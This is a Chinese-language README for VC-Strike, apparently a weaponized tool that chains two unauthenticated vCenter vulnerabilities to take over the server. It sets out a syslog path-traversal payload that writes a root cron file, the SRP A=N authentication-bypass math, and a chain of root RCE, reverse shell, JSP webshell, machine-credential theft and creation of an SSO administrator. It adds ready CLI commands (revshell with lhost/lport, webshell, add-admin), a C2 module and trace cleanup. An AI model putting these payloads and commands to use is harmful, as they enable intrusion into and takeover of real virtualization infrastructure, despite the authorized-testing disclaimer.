<div align="center">

<img src="screenshots/gui-targets.png" alt="VC-Strike 主界面" width="88%">

[![Release](https://img.shields.io/github/v/release/chu0119/vc-strike?label=%E7%89%88%E6%9C%AC&color=blue)](https://github.com/chu0119/vc-strike/releases)
[![CI](https://github.com/chu0119/vc-strike/actions/workflows/ci.yml/badge.svg)](https://github.com/chu0119/vc-strike/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/Python-3.8%2B-informational)](https://www.python.org)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)](https://github.com/chu0119/vc-strike)
[![License](https://img.shields.io/badge/License-MIT%20%2B%20%E6%8E%88%E6%9D%83%E9%99%90%E5%AE%9A-green)](LICENSE)
[![Stars](https://img.shields.io/github/stars/chu0119/vc-strike?style=social)](https://github.com/chu0119/vc-strike/stargazers)

**九页签一体化 · 从指纹到交付的全流程闭环**

**九页签一体化 · 从指纹到交付的全流程闭环**

| | |
|:---:|:---:|
| <img src="screenshots/gui-59310.png" alt="CVE-2026-59310" width="98%"> <img src="screenshots/gui-59309.png" alt="CVE-2026-59309" width="98%"> | <img src="screenshots/gui-chain.png" alt="一键打通" width="98%"> <img src="screenshots/gui-vops.png" alt="vSphere 管理" width="98%"> |
| **② CVE-2026-59310 利用** | **⑧ 一键打通 / ⑨ vSphere 管理** |

<sub>更多页签截图见 [screenshots/](screenshots/)：③ 目录接管 · ④ C2 会话 · ⑤ 后渗透 · ⑥ 清理中心 · ⑦ 检测加固</sub>

</div>

## 🧠 漏洞原理

两个漏洞都无需任何凭据，仅需网络可达即可利用——这正是 CVSS 9.8 的含义。

### CVE-2026-59310 — vCenter Syslog 目录遍历 → root RCE

vCenter 内置 rsyslog 服务接收 ESXi 主机日志，其动态路径模板将 RFC5424 报文头
字段**未净化**地拼接进落盘路径：

```
$template rsyslogadminLoc, "/var/log/vmware/%app-name%/%app-name%-syslog.log"
```

攻击者构造 APP-NAME 携带遍历序列的报文即可逃出日志目录：

```
<134>1 <时间戳> h rsyslog/../../../../../etc/cron.d/pwn 1 ID47 - <载荷>
              ~~~~~~~~~~~~~~~~~~~~~~~
              APP-NAME = rsyslog/../../../../../etc/cron.d/pwn
              → 落盘 /etc/cron.d/pwn-syslog.log（root 属主，内容完全可控）
```

三个条件缺一不可，而 vCenter 出厂默认全部满足：
1. 动态模板 `%app-name%` 拼接（目录名 + 文件名双注入点）
2. 选择器 `:app-name, startswith, "rsyslog"` 仅前缀匹配——`rsyslog/…` 即命中
3. `$EscapeControlCharactersOnReceive off` 允许换行穿透，控制落盘文件的行结构

**关键绕过**：pmrfc3164 解析器在 `/` 处截断 APP-NAME（无法遍历），但同一端口
**同时接受 RFC5424**——pmrfc5424 对 APP-NAME 无字符白名单，遍历序列完整保留。
这也是修复版 `secpath-replace` 要补的核心点。

### CVE-2026-59309 — vmdird SRP 认证绕过 → 任意身份目录接管

vmdird 的 LDAP SASL SRP 实现（Cyrus SASL `libsrp.so`）未按 RFC5054 §3.1
校验客户端公值 **A ≢ 0 (mod N)**。发送 **A = N**：

```
u = H(A | B)                    ← 公开
S = (v^u · A)^b mod N = 0       ← A ≡ 0 (mod N)，与口令验证元 v 无关
K = H(bytes(S)) = SHA1(b"")     ← BN_bn2bin(0) 输出空串 → 公开常量
M1 = H(Ng ⊕ ‖ H(U) ‖ s ‖ A ‖ B ‖ K ‖ H(I) ‖ H(L))
     ↑ 全部输入公开或自选 → 可伪造
```

服务端比对 M1 一致即认证通过——以任意**存在**的身份获得 SSO 目录读写。
修复版增加 `BN_div` 校验并返回
`Illegal value for 'A' (A mod N == 0)`（VC-Strike 识别该报错并判定已修复）。

> 📖 完整协议细节（SRP 三步报文格式、M1/M2 构造、AES-128-OFB+HMAC-SHA1
> 安全层逐字段对照 cyrus-sasl 2.1.26 `plugins/srp.c`）见
> [docs/漏洞分析.md](docs/漏洞分析.md)。

## ⛓️ 攻击链

```
        ┌─────────────────────────────────────────────────────────┐
        │  目标 vCenter（UDP/514 可达即可，全程无凭据）             │
        └──────────────────────────┬──────────────────────────────┘
                                   │
     ┌─────────────────────────────┴──────────────────────────────┐
     │ CVE-2026-59310                                             │
     │ RFC5424 APP-NAME 路径穿越 → 任意路径 root 写入              │
     │   ├─ /etc/cron.d/<x>-syslog.log（一次性自毁 cron）          │
     │   │    └─ crond 以 root 执行（约 60s）                      │
     │   │         ├─ 命令输出 → htdocs → VAMI:5480 HTTP 回显      │
     │   │         ├─ 反弹 shell（bash/python，base64 封装）       │
     │   │         └─ JSP 落地 perfcharts statsreport              │
     │   └─ 备用向量：HOSTNAME = ../ × 16（esxLoc 模板）           │
     └──────────────────────────┬──────────────────────────────┘
                                │
     ┌──────────────────────────┴──────────────────────────────┐
     │ 凭据收获                                                 │
     │  lwregshell → dcAccountDN / dcAccountPassword（机器账户）│
     │  + SSO 域名（dcAccountDN 推导）                          │
     └──────────────────────────┬──────────────────────────────┘
                                │
     ┌──────────────────────────┴──────────────────────────────┐
     │ CVE-2026-59309                                          │
     │ SASL SRP：A=N → S=0 → K=SHA1("") → 伪造 M1 → bind 成功  │
     │  → 任意身份读写 SSO 目录                                 │
     └──────────────────────────┬──────────────────────────────┘
                                │
                    ┌───────────┴────────────┐
                    │ 新建账户 → 加入 Administrators│
                    │ → bind 回验 + 组成员确认      │
                    │ → 交付可登录 /ui 的管理员      │
                    └────────────────────────┘
```

## 🧰 功能

| 模块 | 能力 |
|---|---|
| **指纹** | 批量探测 443/5480/514/1514/389/636/2020、API 版本、rootDSE SASL 机制；CSV 报告（仅探测不利用）|
| **59310 利用** | 非破坏写入验证 · 任意文件写（APP-NAME/HOSTNAME 双向量+报文预览）· RCE + VAMI HTTP 回显 · RCE 落盘 · 反弹 shell · JSP WebShell 植入 |
| **59309 利用** | SRP 机制探测 · **认证绕过**（A=N → K=SHA1("")）· SSO 用户/管理员组枚举 · 创建 SSO 管理员 · 重置任意账户密码 · LDAP 查询控制台 |
| **⑧ 一键打通** | 只填 IP：59310 RCE → 机器账户/SSO 域提取 → 目录接管（机器账户 bind，59309 SRP 降级）→ 新建管理员 → bind 回验+组成员确认 → 交付可登录 /ui 的账户；三路自动降级 |
| **⑨ vSphere 管理** | 用交付账户经官方 REST API 只读盘点（VM/主机/存储/集群/网络）；单台电源操作（VM-ID 确认+二次弹窗）；VM 导出（OVF/OVA，封装官方 ovftool，开机 VM 自动关机/恢复）|
| **C2** | 多端口监听 · 多会话管理（GUI 会话表 / CLI REPL）· 交互直通 · exec 回显 · **上传/下载**（shell 通道 base64 分块 + md5 校验）|
| **后渗透** | 系统信息 · vmdir 机器账户提取 · SSO 域名读取 · 网络/服务/计划任务盘点 · 入侵痕迹快扫 |
| **清理** | 全动作自动登记 → 一键生成清理命令 / 一键清除目标残留（经 RCE）|
| **检测加固** | 版本自查 · rsyslog 危险模板排查 · 入侵痕迹排查 · IOC · 缓解措施 |

## 📸 界面

| 页签 | 说明 |
|---|---|
| <img src="screenshots/gui-targets.png" width="420"> | **① 目标与指纹** — 批量探测、CSV 导出、右键菜单（设为当前/单台指纹/复制/移除），列宽可拖拽 |
| <img src="screenshots/gui-59310.png" width="420"> | **② CVE-2026-59310 利用** — 写入验证 / 任意文件写 / RCE 回显 / 反弹 / WebShell |
| <img src="screenshots/gui-59309.png" width="420"> | **③ CVE-2026-59309 利用** — 绕过、枚举、建管、重置、删除、LDAP 控制台 |
| <img src="screenshots/gui-c2.png" width="420"> | **④ C2 / 反弹 Shell** — 多会话表 + 实时终端 + 上传下载 |
| <img src="screenshots/gui-postex.png" width="420"> | **⑤ 后渗透** — 七个一键动作 + 自定义命令，凭据自动入账 |
| <img src="screenshots/gui-cleanup.png" width="420"> | **⑥ 清理中心** — 动作自动登记 → 一键生成清理命令 / 一键清除目标残留 |
| <img src="screenshots/gui-detect.png" width="420"> | **⑦ 检测与加固** — 防御侧自查 / IOC / 缓解措施 |
| <img src="screenshots/gui-chain.png" width="420"> | **⑧ 一键打通** — 只填 IP 全自动交付管理员，Markdown 报告导出 |
| <img src="screenshots/gui-vops.png" width="420"> | **⑨ vSphere 管理** — VM 清单（排序/右键菜单）、只读检查、电源操作、导出 OVA |

<sub>截图摄于 150% DPI（1920×1040 逻辑窗口）。完整 9 页签见 [screenshots/](screenshots/)。</sub>

## 🚀 快速开始

```bash
git clone https://github.com/chu0119/vc-strike.git
cd vc-strike

python -m vcstrike selftest      # 离线自检（AES 向量/BER/SRP 构造）
python vc-strike.py              # GUI（无参数默认）
python -m vcstrike --help        # CLI
```

CLI 速览（完整见 [docs/使用手册](docs/使用手册.md)）：

```bash
# 指纹（仅探测）
python -m vcstrike scan 10.0.0.1,10.0.0.2 --out r.csv

# CVE-2026-59310：写入验证 → RCE 带回显 → WebShell → 反弹
python -m vcstrike check59310 10.0.0.1
python -m vcstrike exec59310 10.0.0.1 -c 'id; cat /etc/vmware-release'
python -m vcstrike webshell 10.0.0.1
python -m vcstrike revshell 10.0.0.1 --lhost 10.0.0.5 --lport 4444

# CVE-2026-59309：探测 → 绕过 → SSO 目录操作
python -m vcstrike check59309 10.0.0.1 --bypass
python -m vcstrike ldap59309 10.0.0.1 enum-users
python -m vcstrike ldap59309 10.0.0.1 add-admin --user pentest_x --pass 'Str0ng!Pass'

# 后渗透
python -m vcstrike postex 10.0.0.1 machine-creds

# 一键打通：59310/59309 联动，交付可登录 /ui 的 SSO 管理员
python -m vcstrike chain 10.0.0.1

# vSphere 管理（用交付账户）
python -m vcstrike vops 10.0.0.1 --user 'x@vsphere.local' --pass 'xxx' --action vms
```

## 🧾 运行日志（测试后请回传）

每次运行自动在 **exe/脚本同目录** 生成日志：`vc-strike-<gui|cli>-<时间戳>.log`

- 内容：环境头（版本/系统/DPI 缩放）、全部操作记录与结果、异常完整堆栈、
  C2 会话原始流（ANSI 已剥离）、结束标记
- GUI 底部日志栏有 **"打开日志目录"** 按钮可直接定位
- ⚠️ **隐私约定**：日志含目标凭据（如提取到的机器账户密码）与 C2 会话内容，
  命令行中的 `--pass/--password` 值会自动掩码。**回传前请自行审阅清洗**，
  确认无超出授权范围的敏感信息
- **测试结束后直接把日志文件发给维护者**，即可基于真实运行数据做
  二次加固与修复（无需复述操作过程）

## 📖 文档

- [使用手册（GUI/CLI/C2 全参数）](docs/使用手册.md)
- [漏洞分析（协议级细节）](docs/漏洞分析.md)
- [检测与加固（防御视角）](docs/检测与加固.md)

## 🗂 工作约定（维护守则）

- **本地仓库：`D:\xiangmu\vc-strike`** —— 本项目的全部开发、测试、构建、打包
  操作一律在项目目录内进行，构建产物（build/dist/spec）也留在目录内，
  不外散、不提交进 git。
- 预编译 exe 挂 **GitHub Releases**，仓库内只进源码与文档。
- UI / 交互改动请走 `tools_ui_shots.py` 截图 + Agent 审查循环，全部页签
  PASS 后再合入（流程见 CONTRIBUTING.md）。

## 📦 打包与下载

**预编译版本**：[Releases](https://github.com/chu0119/vc-strike/releases) 下载

| 产物 | 说明 |
|---|---|
| `VC-Strike.exe` | 单文件，CLI + GUI 双形态（带控制台）|
| `VC-Strike-GUI.exe` | 单文件纯 GUI（无控制台窗口）|
| `checksums.txt` | SHA256 校验值 |

> PyInstaller 打包的 exe 可能被杀毒软件误报（通用壳特征），请以 checksums.txt
> 校验为准，或直接 `python vc-strike.py` 源码运行（零依赖，无供应链风险）。

**本地打包**（在项目目录 `D:\xiangmu\vc-strike` 内执行）：

```bash
pip install pyinstaller
python -m PyInstaller --noconfirm --clean --onefile --name VC-Strike vc-strike.py
python -m PyInstaller --noconfirm --clean --onefile --windowed --name VC-Strike-GUI vc-strike-gui.py
# 产物在 dist/ 下；校验值：
python -c "import hashlib,glob;[print(hashlib.sha256(open(f,'rb').read()).hexdigest(), f) for f in glob.glob('dist/*')]"
```

## 🛡️ 安全边界（有意不实现）

本工具面向**授权测试**，演示止步于权限与影响证明（root RCE、WebShell、
目录管理员、凭据提取）。以下能力**不会**实现，请勿提 issue：

- ESXi 勒索 / 虚拟机破坏类操作
- 隐蔽持久化（开机自启、beacon 心跳、断线自动重连）
- 免杀 / EDR 规避 / 流量伪装

## ⚠️ 关于代码中的 SHA-1 / AES-OFB / 自签 TLS

这些是**被测协议的既定构成**：CVE-2026-59309 的会话密钥 K 恒等于
`SHA1("")`，SASL 安全层固定 AES-128-OFB + HMAC-SHA1（服务端 srp.c 硬编码），
vCenter 出厂自签证书。它们不是本工具自身的安全选择，替换将导致协议
不兼容、利用必然失败（详见源码 `[协议保真]` 注释块与
[docs/漏洞分析.md](docs/漏洞分析.md)）。

## 🤝 贡献与反馈

见 [CONTRIBUTING.md](CONTRIBUTING.md) 与 [SECURITY.md](SECURITY.md)。
漏洞利用相关的 issue/PR 请附授权背景说明。

## 📄 法律声明

本仓库以 [MIT License](LICENSE) 开源，但**授权范围不含任何未授权访问行为**。
使用者应遵守所在司法辖区的法律法规（包括但不限于《网络安全法》、
《计算机欺诈与滥用法》等）。项目作者不对滥用行为承担责任。

## 🙏 参考

- [ChinaRan0/CVE-2026-59310-POC](https://github.com/ChinaRan0/CVE-2026-59310-POC) — 上游 POC/EXP
- [QUIRSO/QTR](https://github.com/QUIRSO/QTR) — IR 工件与 IOC
- [Mobeta 技术分析](https://mobeta.fr/blog/vcenter-cve-2026-59309-cve-2026-59310/)
- [VMSA-2026-0006](https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/38017) /
  [GHSA-xmp9-244p-5ggv](https://github.com/rsyslog/rsyslog/security/advisories/GHSA-xmp9-244p-5ggv)
